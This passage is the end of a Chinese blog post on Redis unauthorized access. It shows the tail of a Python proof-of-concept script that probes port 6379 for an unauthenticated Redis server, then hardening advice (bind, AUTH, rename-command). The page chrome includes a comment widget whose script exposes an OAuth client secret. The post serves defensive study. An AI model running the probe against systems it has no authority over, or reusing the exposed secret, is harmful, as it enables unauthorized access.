        port = 6379<br />
        s.connect((host, port))<br />
        s.send(payload)<br />
        recvdata = s.recv(1024)<br />
        if recvdata and 'redis_version' in recvdata:<br />
            result['VerifyInfo'] = {}<br />
            result['VerifyInfo']['URL'] = self.url<br />
            result['VerifyInfo']['Port'] = port<br />
    except:<br />
        pass<br />
    s.close()<br />
    return self.parse_attack(result)<br />
 <br />
def _attack(self):<br />
    return self._verify()<br />
 <br />
def parse_attack(self, result):<br />
    output = Output(self)<br />
    if result:<br />
        output.success(result)<br />
    else:<br />
        output.fail('Internet nothing returned')<br />
    return output<br />
</code></pre></div></div><br />
<br />
<p>register(TestPOC)<br />
二、安全建议<br />
配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口6379<br />
配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中<br />
配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度<br />
好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config</p><br />
<br />
<p>https://help.compose.com/docs/redis-ssh-tunnels</p><br />

					 <span class='st_sharethis_large' displayText='ShareThis'></span>
						<span class='st_facebook_large' displayText='Facebook'></span>
						<span class='st_twitter_large' displayText='Tweet'></span>
						<span class='st_linkedin_large' displayText='LinkedIn'></span>
						<span class='st_pinterest_large' displayText='Pinterest'></span>
						<span class='st_email_large' displayText='Email'></span>
                </div>
                Category storage
        </div>
	</div>
  
  
       <!--赞-->
    	  <div class="row">
            <div class="col-lg-6">
                <img src="https://xiazemin.github.io/MyBlog/img/webwxgetmsgimg.jpeg"  height="400" width="auto" />
            </div>
          </div>

        <div class="row">
                <div class="col-md-12">
			<div id="disqus_thread"></div>

<div id="gitmentContainer"></div>
<link rel="stylesheet" href="/MyBlog/css/default.css">
<script src="/MyBlog/js/gitment.browser.js"></script>
<script type="text/javascript" src="/MyBlog/js/json2.js"></script>
<script>
var gitment = new Gitment({
    owner: 'xiazemin',
    repo: 'MyBlogComment',
    oauth: {
        client_id: '981ba8c916c262631ea0',
        client_secret: 'a52260ef92de69011ccd1cf355b973ef11d6da0e',
    },
});

var MyGitmentContainer=gitment.render('gitmentContainer');
window.setTimeout(MyGitMentBtnclick,1000); 
//document.ready(function(){ 
//window.onload=function(){}

function MyGitMentBtnclick(){
//var MyGitmentContainer=document.getElementById('gitmentContainer');
	var ele=[],all=MyGitmentContainer.getElementsByTagName("*");
	for(var i=0;i<all.length;i++){
	  if(all[i].className=='gitment-comments-init-btn'){
		MyGitMentBtn=all[i];
		console.log(MyGitMentBtn);
		MyGitMentBtn.click();
	  }
	}
}

</script>



			<!--script>
			/**
			* RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
			* LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
			*/
			/*
			var disqus_config = function () {
			this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
			this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
			};
			*/
			(function() { // DON'T EDIT BELOW THIS LINE
			var d = document, s = d.createElement('script');

			s.src = '//airrayagroup.disqus.com/embed.js';

			s.setAttribute('data-timestamp', +new Date());
			(d.head || d.body).appendChild(s);
			})();
			</script>
			<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
			<script id="dsq-count-scr" src="//airrayagroup.disqus.com/count.js" async></script-->
          </div>
       </div>

</div>
<hr>
     <footer>
        <div class="container">
             <a href="/MyBlog/" style="color: green; font-size: 2em; font-family: 'Schoolbell', cursive;">首页</a>
            <div class="row">
                <div class="col-lg-6">
                    <p>Copyright &copy; 2017 465474307@qq.com <p>
                </div>
                <div class="col-lg-6">
                    <p style="float: right;">Jekyll theme by <a href="https://github.com/xiazemin/">夏泽民</a></p>
                </div>
            </div>
        </div>
    </footer>
	
    <!-- jQuery -->
    <script src="/MyBlog/js/jquery-1.12.0.min.js"></script>
    <script src="/MyBlog/js/jquery-migrate-1.2.1.min.js"></script>

    <!-- Latest compiled and minified JavaScript -->
    <script src="/MyBlog/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
        <!-- Menu Toggle Script -->
    <script>
    $("#menu-toggle").click(function(e) {
        e.preventDefault();
        $("#wrapper").toggleClass("toggled");
    });
    </script>
    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"slide":{"type":"slide","bdImg":"6","bdPos":"right","bdTop":"100"},"image":{"viewList":["qzone","tsina","tqq","renren","weixin"],"viewText":"分享到：","viewSize":"16"}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/MyBlog/shareapi/js/share.js?v=89860593.js?'];</script>


<!-- 2d  -->
<script type="text/javascript" charset="utf-8"  src="/MyBlog/js/L2Dwidget.0.min.js"></script>
<script type="text/javascript" charset="utf-8"  src="/MyBlog/js/L2Dwidget.min.js"></script>
<script type="text/javascript">
 setTimeout(()=> {
/*L2Dwidget.init({"display": {
        "superSample": 2,
        "width": 200,
        "height": 400,
             "position": "right",
                 "hOffset": 0,
        "vOffset": 0
          }
     });
*/
 L2Dwidget
        .on('*', (name) => {
          console.log('%c EVENT ' + '%c -> ' + name, 'background: #222; color: yellow', 'background: #fff; color: #000')
        })
        .init({
          dialog: {
            // 开启对话框
            enable: true,
            script: {
              // 每空闲 10 秒钟，显示一条一言
              'every idle 10s': '$hitokoto$',
              // 当触摸到星星图案
              'hover .star': '星星在天上而你在我心里 (*/ω＼*)',
              // 当触摸到角色身体
              'tap body': '哎呀！别碰我！',
              // 当触摸到角色头部
              'tap face': '人家已经不是小孩子了！'
            }
          }
        });

})
</script>



    <!--html xmlns:wb="http://open.weibo.com/wb">
    <script src="http://tjs.sjs.sinajs.cn/open/api/js/wb.js" type="text/javascript" charset="utf-8"></script>
    <wb:follow-button uid="2165491993" type="red_1" width="67" height="24" ></wb:follow-button-->

      <!--本文来自-->
     <script type="text/javascript">
      /* 仅IE
     document.body.oncopy = function(){
        setTimeout( 
            function () { 
        var text =window.clipboardData.getData("text"); 
        if (text) { 
            text = text + "/r/n本篇文章来源于 xiazemin 的 泽民博客|https://xiazemin.github.io/MyBlog/index.html 原文链接："+location.href; clipboardData.setData("text", text); 
          }
       },
     100 )
    }
     */
     //绑定在了body上，也可以绑定在其他可用元素行，但是不是所有元素都支持copy和past事件。

     /*
$(document.body).bind({
    copy: function(event) {//copy事件
        //var cpTxt = "复制的数据";
        var clipboardData = window.clipboardData; //for IE
        if (!clipboardData) { // for chrome
            clipboardData = event.originalEvent.clipboardData;
        }

        if (event.clipboardData != null/false/undefined) { //ignore the incorrectness of the truncation
        clipboarddata = event.clipboardData;
        } else if (window.clipboardData != null/false/undefined) {
         clipboarddata = window.clipboardData;
        } else { //default to the last option even if it is null/false/undefined
         clipboarddata = event.originalEvent.clipboardData;
        }

        //e.clipboardData.getData('text');//可以获取用户选中复制的数据
        //clipboardData.setData('Text', cpTxt);
        alert(clipboarddata.getData('text'));
        //$('#message').text('Copy Data : ' + cpTxt);
        return false;//否则设不生效
    },paste: function(e) {//paste事件
        var eve = e.originalEvent
        var cp = eve.clipboardData;
        var data = null;
        var clipboardData = window.clipboardData; // IE
        if (!clipboardData) { //chrome
            clipboardData = e.originalEvent.clipboardData
        }
        data = clipboardData.getData('Text');
        //$('#message').html(data);
    }
});     
*/
function addLink() {
    var body_element = document.getElementsByTagName('body')[0];
    var selection;
    selection = window.getSelection();
    var pagelink = "<br /><br />本文来源：xiazemin 的 泽民博客 <a href='"+document.location.href+"'>"+document.location.href+"</a>";
//+document.location.href+当前页面链接
    var copy_text = selection + pagelink;
    console.log(copy_text);
    var new_div = document.createElement('div');
    new_div.style.left='-99999px';
    new_div.style.position='absolute';
    body_element.appendChild(new_div );
    new_div.innerHTML = copy_text ;
    selection.selectAllChildren(new_div );
    window.setTimeout(function() {
        body_element.removeChild(new_div );
    },0);
}
document.oncopy = addLink;
     </script>
    <!--本文来自-->

</div>
  </body>

</html>